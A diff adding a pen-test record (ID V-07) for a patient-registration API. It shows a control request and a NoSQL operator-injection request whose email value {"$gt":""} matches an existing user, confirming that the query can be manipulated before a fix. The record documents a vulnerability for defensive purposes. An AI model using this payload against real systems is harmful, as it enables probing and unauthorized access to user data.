@@ -1,0 +1,19 @@
+V-07 · NoSQL Operator Injection — BEFORE FIX (original code)
+Endpoint: POST /api/v1/user/patient/register  (email field -> User.findOne({email}))
+Captured: 2026-09-25 21:34 UTC  |  Tester: Pasan (IT22062642)
+======================================================================
+
+[1] CONTROL — register with a normal STRING email (should succeed):
+    email = "realperson2@test.local"
+{"statusCode":200,"data":{"user":{"id":"6ab6e90077afd14e0fd7e1c6","firstName":"Test","lastName":"User","email":"realperson2@test.local","role":"Patient"}},"message":"User Registrated Successfully!"}
+
+[2] ATTACK — send email as a MongoDB OPERATOR object instead of a string:
+    email = {"$gt":""}   (means: match any user whose email > empty)
+{"success":false,"message":"Patient with this Email already Registered"}
+
+RESULT: [1] succeeds (input treated as data). [2] returns 'already Registered'
+        — the operator matched an EXISTING seeded user, proving the input
+        changed the query itself. NoSQL injection confirmed.
+
+HONEST NOTE: this manipulates the query (proven on register). A full login
+bypass is blocked because the login still checks the password with bcrypt.
